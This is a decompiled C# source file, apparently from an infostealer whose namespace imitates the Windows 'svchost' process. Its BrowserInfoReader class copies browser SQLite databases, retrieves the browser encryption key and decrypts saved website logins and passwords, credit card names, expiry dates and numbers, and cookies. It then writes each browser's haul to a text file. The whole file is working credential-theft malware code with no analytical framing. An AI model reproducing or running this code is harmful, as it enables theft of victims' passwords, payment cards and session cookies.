using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;

namespace Svc_host;

public class BrowserInfoReader
{
	private BrowserList browserList = new BrowserList();

	public int GetLogins(string basePath)
	{
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		int num = 0;
		if (browserList.Browsers != null && browserList.Browsers.Count != 0)
		{
			foreach (BrowserInfo browser in browserList.Browsers)
			{
				if (!(string.IsNullOrEmpty(browser.LoginsPath) | !File.Exists(browser.LoginsPath)))
				{
					byte[] array = Decryption._getKey(browser.KeyPath);
					if (array != null)
					{
						List<string> list = new List<string>();
						string text = "SELECT origin_url,  username_value, password_value FROM logins";
						string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Path.GetRandomFileName();
						File.Copy(browser.LoginsPath, text2);
						SQLiteConnection val = new SQLiteConnection("Data Source=" + text2 + ";");
						try
						{
							SQLiteCommand val2 = new SQLiteCommand(text, val);
							((DbConnection)(object)val).Open();
							((DbCommand)val2).ExecuteNonQuery();
							SQLiteDataReader val3 = val2.ExecuteReader();
							while (((DbDataReader)(object)val3).Read())
							{
								list.Add($"Website: {((DbDataReader)(object)val3)[0]}\nLogin: {((DbDataReader)(object)val3)[1]}\nPassword: {Decryption._decryptWithKey((byte[])((DbDataReader)(object)val3)[2], array, 3)}\n");
							}
						}
						finally
						{
							((IDisposable)val)?.Dispose();
						}
						if (list.Count > 0)
						{
							Writer.Write(list, basePath + "\\" + browser.Name + ".txt");
						}
						num += list.Count;
					}
				}
			}
			return num;
		}
		throw new Exception();
	}

	public int GetCards(string basePath)
	{
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		int num = 0;
		if (browserList.Browsers != null && browserList.Browsers.Count != 0)
		{
			foreach (BrowserInfo browser in browserList.Browsers)
			{
				if (!(string.IsNullOrEmpty(browser.CardsPath) | !File.Exists(browser.CardsPath)))
				{
					byte[] array = Decryption._getKey(browser.KeyPath);
					if (array != null)
					{
						string text = "SELECT name_on_card,  expiration_month, expiration_year, card_number_encrypted FROM credit_cards";
						List<string> list = new List<string>();
						string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Path.GetRandomFileName();
						File.Copy(browser.CardsPath, text2);
						SQLiteConnection val = new SQLiteConnection("Data Source=" + text2 + ";");
						try
						{
							SQLiteCommand val2 = new SQLiteCommand(text, val);
							((DbConnection)(object)val).Open();
							((DbCommand)val2).ExecuteNonQuery();
							SQLiteDataReader val3 = val2.ExecuteReader();
							while (((DbDataReader)(object)val3).Read())
							{
								list.Add($"OwnerName: {((DbDataReader)(object)val3)[0]}\nExpirationTime: {((DbDataReader)(object)val3)[1]}:{((DbDataReader)(object)val3)[2]}\nCardNumbers: {Decryption._decryptWithKey((byte[])((DbDataReader)(object)val3)[3], array, 3)}" + "\n");
							}
						}
						finally
						{
							((IDisposable)val)?.Dispose();
						}
						if (list.Count > 0)
						{
							Writer.Write(list, basePath + "\\" + browser.Name + ".txt");
						}
						num += list.Count;
					}
				}
			}
			return num;
		}
		throw new Exception();
	}

	public int GetCookies(string basePath)
	{
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		int num = 0;
		if (browserList.Browsers != null && browserList.Browsers.Count != 0)
		{
			foreach (BrowserInfo browser in browserList.Browsers)
			{
				if (!string.IsNullOrEmpty(browser.CookiePath) && File.Exists(browser.CookiePath))
				{
					byte[] array = Decryption._getKey(browser.KeyPath);
					if (array != null)
					{
						List<string> list = new List<string>();
						string text = "SELECT host_key, name, path, is_secure, expires_utc, encrypted_value, is_httponly FROM cookies";
						string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Path.GetRandomFileName();
						File.Copy(browser.CookiePath, text2);
						SQLiteConnection val = new SQLiteConnection("Data Source=" + text2 + ";");
						try
						{
							SQLiteCommand val2 = new SQLiteCommand(text, val);
							((DbConnection)(object)val).Open();
							((DbCommand)val2).ExecuteNonQuery();
							SQLiteDataReader val3 = val2.ExecuteReader();
							while (((DbDataReader)(object)val3).Read())
							{
								string text3 = ((DbDataReader)(object)val3)[0].ToString();
								string text4 = ((DbDataReader)(object)val3)[1].ToString();
								string text5 = ((DbDataReader)(object)val3)[2].ToString();
								bool flag = ((DbDataReader)(object)val3)[3].ToString() == "0";
								string text6 = ((DbDataReader)(object)val3)[4].ToString();
								byte[] array2 = (byte[])((DbDataReader)(object)val3)[5];
								if (array2 != null)
								{
									string text7 = Decryption._decryptWithKey(array2, array, 3).ToString();
									bool flag2 = ((DbDataReader)(object)val3)[6].ToString() == "0";
									string item = text3 + "\t" + flag2.ToString().ToUpper() + "\t" + text5 + "\t" + flag.ToString().ToUpper() + "\t" + text6 + "\t" + text4 + "\t" + text7 + "\r";
									list.Add(item);
								}
							}
						}
						finally
						{
							((IDisposable)val)?.Dispose();
						}
						if (list.Count > 0)
						{
							Writer.Write(list, basePath + "\\" + browser.Name + ".txt");
						}
						num += list.Count;
					}
				}
			}
			return num;
		}
		throw new Exception();
	}
}
